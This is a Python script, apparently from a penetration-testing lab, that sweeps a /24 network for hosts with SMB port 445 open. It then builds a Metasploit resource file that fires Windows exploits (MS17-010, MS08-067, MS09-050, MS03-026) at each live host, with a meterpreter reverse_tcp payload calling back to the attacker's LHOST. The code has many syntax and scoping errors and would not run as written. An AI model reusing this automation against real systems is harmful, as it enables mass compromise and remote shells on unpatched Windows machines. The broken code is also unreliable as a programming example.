#!/usr/bin/python
###########################################
#Script: winrekt.py
#Authors: n0deal, mayhem, deez
#Developed: March 10, 2018
#
#
#Beta version: 0.3
###########################################




import multiprocessing
import subprocess
import os
import random
import argparse
import time, struct, sys
#import pty

rangeIPs = '10.11.1.{0}'

def pinger( job_q, results_q ):
	DEVNULL = open(os.devnull,'w')
	while True:
		ip = job_q.get()
		if ip is None: break

			try:
				subprocess.check_call(['ping','-c1',ip],stdout=DEVNULL)
				#subprocess.check_call(['nmap','-p445',ip],stdout=DEVNULL)
				#subprocess.check_call(['nmap','-Pn -n -p445 -T4',ip]stderr=DEVNULL)
				results_q.put(ip)
			except:
				pass

def slowMode( job_q, results_q ):
	DEVNULL = open(os.devnull,'w')
	while True:
		ip = job_q.get()
		if ip is None: break

			try:
				subprocess.check_call(['nmap','-n','-p','445','--open','-T4',ip]stderr=DEVNULL)
				results_q.put(ip)
			except:
				pass

def ms17(LHOST):
	f.write("use exploit/windows/smb/ms17_010_psexec\n")
	config(LHOST)

def ms09(LHOST):
	f.write("use exploit/windows/smb/ms09_050_smb2_negotiate_func_index\n")
	config(LHOST)

def ms08(LHOST):
	f.write("use exploit/windows/smb/ms08_067_netapi\n")
	config(LHOST)

def ms03(LHOST):
	f.write("use exploit/windows/dcerpc/ms03_026_dcom\n")
	config(LHOST)

def config(LHOST):
	f.write("set AutoRunScript multi_console_command.rb -r /root/notes/scripts/connect.rc\n")
	f.write("setg PAYLOAD windows/meterpreter/reverse_tcp\n")
	f.write("setg LHOST " + LHOST + "\n")
	while not results.empty():
		ip = results.get()
		#print(ip)
		lport = str(random.randrange(36000,65000))
		f.write("set RHOST " + ip + "\n")
		#f.write("set PAYLOAD windows/meterpreter/reverse_tcp\n")
		#f.write("set LHOST " + LHOST + "\n")
		f.write("set LPORT " + lport + "\n")
		f.write("exploit -jz\n")
	f.close()

def options():
        parse = argparse.ArgumentParser()

	try:
		parse.add_argument("LHOST", required=true, help='Local IP for callbacks')
		#parse.add_argument("targets", help='Target /24 network; syntax 192.168.1')
		#parse.add_argument("lport", required=false type=int, help='TCP port, 1-65535')
		parse.add_argument("exploit", type=int, required=true, help='1: ms17_010| all windows \
		2: ms08_067| windows 2k/2k3/xp \
		3: ms09_050| winows 2k8R2 \
		4: ms03_026| windows 2k/2k3/xp')
		args = parse.parse_args()
		LHOST = args.LHOST;
		#rangeIPs = args.targets + '.' + {0}
	except IndexError:
        	print "[+] Usage %s <lhost> <exploit> % sys.argv[0]
        	sys.exit()

	multi_process()

	if args.exploit == 1:
		ms17(LHOST);
        elif args.exploit == 2:
                ms08(LHOST);
	elif args.exploit == 3:
		ms09(LHOST);
	elif args.exploit == 4:
                ms03(LHOST);

def multi_process():
	pool_size = 254
	f = open('autocrush.rc','w')
	random.seed('autocrush')

	jobs = multiprocessing.Queue()
	results = multiprocessing.Queue()

	pool = [ multiprocessing.Process(target=pinger, args=(jobs,results))
		for i in range(pool_size) ]

	for p in pool:
		p.start()

	for i in range(1,254):
		jobs.put(rangeIPs.format(i))

	for p in pool:
		jobs.put(None)

	for p in pool:
		p.join()


def multi_nmap():
	pool_size = 254
	f = open('autocrush.rc','w')
	random.seed('autocrush')

	jobs = multiprocessing.Queue()
	results = multiprocessing.Queue()

	pool = [ multiprocessing.Process(target=slowMode, args=(jobs,results))
		for i in range(pool_size) ]

	for p in pool:
		p.start()

	for i in range(1,254):
		jobs.put(rangeIPs.format(i))

	for p in pool:
		jobs.put(None)

	for p in pool:
		p.join()


if __name__ == "__main__":
	options()
	#msfconsole -r autocrush.rc
	#pty.spawn('msfconsole -r autocrush.rc')





#Psuedo code for later
#check ping for 64 < ttl < 200
